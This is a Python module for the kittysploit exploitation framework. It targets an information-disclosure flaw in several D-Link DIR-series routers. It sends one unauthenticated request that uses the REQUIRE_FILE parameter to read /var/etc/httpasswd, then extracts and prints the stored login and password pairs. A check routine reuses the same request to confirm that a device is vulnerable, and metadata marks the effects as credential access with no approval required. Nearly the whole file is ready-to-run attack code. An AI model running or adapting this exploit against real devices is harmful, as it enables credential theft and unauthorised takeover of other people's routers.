#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 Info Disclosure',
        'description': 'Module explois information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600,DIR-615 devices. It is possible to retrieve sensitive information such as credentials.',
        'author': ['tytusromekiatomek', 'Marcin Bury', 'Aleksandr Mikhaylov'],
        
        'platform': Platform.LINUX,
        'references': ['http://seclists.org/bugtraq/2013/Dec/11'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
        )
        if response is None:
            return

        creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)

        if len(creds):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *creds)
        else:
            print_error("Credentials could not be found")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd"
        )
        if response is None:
            return False  # target is not vulnerable

        creds = re.findall("\n\t\t\t(.+?):(.+?)(?:\n\n\t\t\t|\nuser)", response.text)

        if len(creds):
            return True  # target is vulnerable

        return False  # target is not vulnerable
